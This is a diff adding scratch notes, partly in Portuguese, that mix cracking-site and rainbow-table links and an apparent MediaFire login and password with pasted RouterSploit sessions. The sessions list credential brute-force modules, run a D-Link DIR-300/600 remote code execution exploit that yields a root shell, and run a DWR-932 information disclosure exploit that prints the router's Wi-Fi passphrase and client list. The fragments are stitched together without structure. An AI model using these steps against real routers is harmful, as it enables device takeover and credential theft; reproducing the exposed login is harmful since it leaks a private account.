@@ -1,0 +1,63 @@
+www.thecrackertechnology.com/2016/01/04/rainbow-tables-wpa-wpa2/
+
+
+rainbowcrack link: http://project-rainbowcrack.com/
+
+
+
+http://project-rainbowcrack.com/table.htm
+
+http://academiadaguitarra.com.br/ebook-dbg-vsl
+
+mediafire _c.almeida CK#*,
+
+
+rsf > use creds/ creds/ftp_bruteforce creds/http_basic_bruteforce creds/http_form_bruteforce creds/snmp_bruteforce creds/ssh_default creds/telnet_default creds/ftp_default creds/http_basic_default creds/http_form_default creds/ssh_bruteforce creds/telnet_bruteforce rsf > use creds/ssh_default rsf (SSH Default Creds) >
+
+
+rsf (D-LINK DIR-300 & DIR-600 RCE) > run [+] Target is vulnerable [*] Invoking command loop... cmd > whoami root 
+
+rsf (D-LINK DIR-300 & DIR-600 RCE) > show options Target options: Name Current settings Description ---- ---------------- ----------- target Target address eg http://192.168.1.1 port 80 Target Port 
+
+
+rsf (D-LINK DIR-300 & DIR-600 RCE) > show info Name: D-LINK DIR-300 & DIR-600 RCE Description: Module exploits D-Link DIR-300, DIR-600 Remote Code Execution vulnerability which allows executing command on operating system level with root privileges. Devices: - D-Link DIR 300 - D-Link DIR 600 Authors: - Michael Messner <devnull[at]s3cur1ty.de> # vulnerability discovery - Marcin Bury <marcin.bury[at]reverse-shell.com> # routersploit module References: - http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router - http://www.s3cur1ty.de/home-network-horror-days - http://www.s3cur1ty.de/m1adv2013-003 
+
+
+ Escolha o módulo
+
+Os módulos localizados no diretório creds/ diretório permitem executar ataques de dicionário contra vários serviços de rede.
+
+Atualmente, os seguintes serviços são suportados:
+
+    ftp
+    ssh
+    telnet
+    http autenticação básica
+    http digest auth
+    autenticação de formulário http
+    snmp 
+
+Todo serviço foi dividido em dois módulos:
+
+    padrão (por exemplo, ssh_default) - este tipo de módulos usa uma lista de palavras com login de pares de credenciais padrão: senha. O módulo pode ser usado rapidamente e, em questão de segundos, pode verificar se o dispositivo usa credenciais padrão.
+    bruteforce (por exemplo, ssh_bruteforce) - esse tipo de módulos executa ataques de dicionário contra uma conta ou lista de contas especificada. É necessário dois parâmetros: login e senha. Esses valores podem ser uma única palavra (por exemplo, 'admin') ou uma lista completa de strings (arquivo: ///root/users.txt). 
+
+
+ rsf > use creds/ creds/ftp_bruteforce creds/http_basic_bruteforce creds/http_form_bruteforce creds/snmp_bruteforce creds/ssh_default creds/telnet_default creds/ftp_default creds/http_basic_default creds/http_form_default creds/ssh_bruteforce creds/telnet_bruteforce rsf > use creds/ssh_default rsf (SSH Default Creds) > 
+
+
+rsf (SSH Default Creds) > show options Target options: Name Current settings Description ---- ---------------- ----------- target Target IP address port 22 Target port Module options: Name Current settings Description ---- ---------------- ----------- threads 8 Numbers of threads defaults file:///root/git/routersploit/routersploit/wordlists/defaults.txt User:Pass or file with default credentials (file://) 
+
+
+sf (SSH Default Creds) > set target 192.168.1.53 [+] {'target': '192.168.1.53'} 
+
+
+rsf > use scanners/dlink_scan rsf (D-Link Scanner) > show options 
+
+Target options: Name Current settings Description ---- ---------------- ----------- target Target address eg http://192.168.1.1 port 80 Target port 
+
+ rsf (D-Link Scanner) > set target 192.168.1.1 [+] {'target': '192.168.1.1'} 
+
+
+rsf (D-Link Scanner) > use exploits/dlink/dwr_932_info_disclosure rsf (D-Link DWR-932 Info Disclosure) > set target 192.168.1.1 [+] {'target': '192.168.1.1'} rsf (D-Link DWR-932 Info Disclosure) > exploit [*] Running module... [*] Decoding JSON value [+] Exploit success Parameter Value --------- ----- get_wps_enable 0 wifi_AP1_enable 1 get_client_list 9c:00:97:00:a3:b3,192.168.0.45,IT-PCs,0>40:b8:00:ab:b8:8c,192.168.0.43,android-b2e363e04fb0680d,0 wifi_AP1_ssid dlink-DWR-932 get_mac_address c4:00:f5:00:ec:40 wifi_AP1_security_mode 3208,8 wifi_AP1_hidden 0 get_mac_filter_switch 0 wifi_AP1_passphrase MyPaSsPhRaSe get_wps_mode 0 
+
